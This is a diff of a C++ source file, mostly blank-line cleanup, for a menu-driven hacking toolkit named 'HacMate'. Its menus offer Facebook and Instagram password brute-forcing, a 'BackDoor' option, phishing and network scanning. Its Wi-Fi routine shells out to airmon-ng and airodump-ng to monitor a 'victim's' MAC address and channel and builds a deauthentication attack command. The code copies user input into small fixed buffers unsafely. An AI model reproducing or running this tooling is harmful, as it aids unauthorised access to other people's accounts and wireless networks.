@@ -12,7 +12,6 @@ void Custom_Password_List();
 
 using namespace std;
 
-
 void Custom_Password_List()
 {
   char ch;
@@ -91,7 +90,6 @@ void BackDoor()
       }
       case 10:
       {
-
         break;
       }
       default : cout<<"\n Enter a Valid Key ";
@@ -99,16 +97,14 @@ void BackDoor()
   }
 }
 
-
 void Pass_Cracking()
 {
 
   char ch;
   int key;
-
+  
   while(key!=10)
   {
-
     cout<<"\n\n\n\x1B[34m*************  Please Enter Your Choice  *************\033[0m\t\t\n\n\n\n";
     cout<<"      1. Facebook Password Cracking (BruteForcing)\n";
     cout<<"      2. Instagram Password Cracking (BruteForcing)\n";
@@ -163,16 +159,13 @@ void Pass_Cracking()
       case 10: return;
       break;
       default : cout<<"\x1B[91mInvalid Key Entered\033[0m";
-
     }
   }
-
 }
 
 
 void Wifi_Hacking()
 {
-
   char ch;
   char wlan_name[10];
   cout<<"\n\n\n\t\t\x1B[34m* Enter Your Wireless Card id *\033[0m\t\t\n\n";
@@ -180,7 +173,6 @@ void Wifi_Hacking()
   cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
   cin>>wlan_name;
   char wlanmon[15];
-
   strcpy(wlanmon,wlan_name);
   strcat(wlanmon,"mon");
   char start[] = "airmon-ng start ";
@@ -189,26 +181,19 @@ void Wifi_Hacking()
   system("airmon-ng check kill");
   strcpy(start,"airodump-ng ");
   strcat(start,wlanmon);
-
   cout<<"\n\n\n\t\t [ Now you have to note down the MAC Address and CH no.(channel no.) of the target ]\n\n\t\t\t NOTE : Target should appear on both the interfaces \n\t\t\t i.e., atleast one device should be connected with the target. \n\n \tYou should enter ctrl+c if note is done\n\n\n \t ENTER ANY ALPHA KEY IF YOU ARE READY\n\n\n";
   cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
   cin>>ch;
   system(start);
   char mac_add[20];
   char channel_no[5];
-
   cout<<"\n\n\n\t\t\x1B[34m* Enter the victim's MAC Address *\033[0m\t\t\n\n";
   cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
   cin>>mac_add;
-
   cout<<"\n\n\n\t\t\x1B[34m* Enter the victim's Channel Number (CH no.)  *\033[0m\t\t\n\n";
   cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
   cin>>channel_no;
-
-
-
   cout<<"\n\n \t\t [ Enter the following command in NEW TERMINAL (in same directory) ] \n\n  \t\t\t\t airodump-ng -c <CH NO.> -w -b <MAC ADDRESS> wlan0mon\n\n\n \t ENTER ANY ALPHA KEY IF YOU ARE READY\n\n\n";
-
   cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
   cin>>ch;
   char long_cmd[] = "airplay-ng -0 0 -a ";
@@ -228,8 +213,6 @@ void Wifi_Hacking()
   cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
   cin>>ch;
 }
-
-
 
 void Phishing()
 {
@@ -253,26 +236,20 @@ void Phishing()
       case 10: return;
       break;
       default : cout<<"\x1B[91mInvalid Key Entered\033[0m";
-
     }
   }
   cout<<"\n\n\n\n\nEnter any Alpha Key to go back : ";
   cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
   cin>>ch;
-
 }
-
-
 
 void Net_Scanning()
 {
-
   char ip[30];
   char ch;
   int key;
   while (key!=10)
   {
-
 
     cout<<"\n\n\n\x1B[34m*************  Please Enter Your Choice  *************\033[0m\t\t\n\n\n\n";
     cout<<"      1. Find Live Hosts on Network\n";
@@ -285,13 +262,10 @@ void Net_Scanning()
     cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
     cin>>key;
 
-
     switch (key)
     {
-
       case 1:
       {
-
         cout<<"\n\t\t\x1B[36mEnter the ip to Scan :\033[0m";
         cout<<"\n\n\x1B[93mHacMate[~]->\033[0m";
         cin>>ip;
@@ -306,7 +280,6 @@ void Net_Scanning()
       break;
       case 2:
       {
-
         cout<<"\n\t\t\x1B[36mEnter the ip to Scan :\033[0m ";
         cout<<"\n\n\x1B[93mHacMate[~]->\033[0m";
         cin>>ip;
@@ -322,7 +295,6 @@ void Net_Scanning()
       break;
       case 3:
       {
-
         cout<<"\n\t\t\x1B[36mEnter the ip to Scan :\033[0m ";
         cout<<"\n\n\x1B[93mHacMate[~]->\033[0m";
         cin>>ip;
@@ -337,7 +309,6 @@ void Net_Scanning()
       break;
       case 4:
       {
-
         cout<<"\n\t\t\x1B[36mEnter the ip to Scan :\033[0m ";
         cout<<"\n\n\x1B[93mHacMate[~]->\033[0m";
         cin>>ip;
@@ -352,9 +323,7 @@ void Net_Scanning()
       break;
       case 5:
       {
-
         system("locate .nse | grep ftp");
-
         cout<<"\n\n\n\n\nEnter any Alpha Key to go back : ";
         cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
         cin>>ch;
@@ -362,7 +331,6 @@ void Net_Scanning()
       break;
       case 6:
       {
-
         cout<<"\n\t\t\x1B[36mEnter the ip to Scan :\033[0m ";
         cout<<"\n\n\x1B[93mHacMate[~]->\033[0m";
         cin>>ip;
@@ -382,21 +350,13 @@ void Net_Scanning()
   }
 }
 
-
-
-
 int main()        //main function
 {
   system("clear");
   Choice();       //calling chioce function
-
   system("clear");
-
   return 0;
 }
-
-
-
 
 void Choice()      //choice function definition
 {
@@ -404,10 +364,7 @@ void Choice()      //choice function definition
   int key;
   while(key != 10)
   {
-
-
     cout<<"\n\n";
-
     cout<<"              HHH   HHH    MMM       MMM\n             HHH   HHH    MMMM     MMMM\n            HHHHHHHHH    MMM MM MM MMM\n           HHHHHHHHH    MMM  MMM  MMM\n          HHH   HHH    MMM   M   MMM\n         HHH   HHH    MMM       MMM";
     cout<<"\n\n\n\x1B[34m*************  Please Enter Your Choice  *************\033[0m\t\t\n\n\n\n";
     cout<<"     1. Network Scanning\n";
@@ -442,8 +399,5 @@ void Choice()      //choice function definition
                 break;
         default : cout<<"\x1B[91mInvalid Key Entered\033[0m";
       }
-
-
   }
-
 }
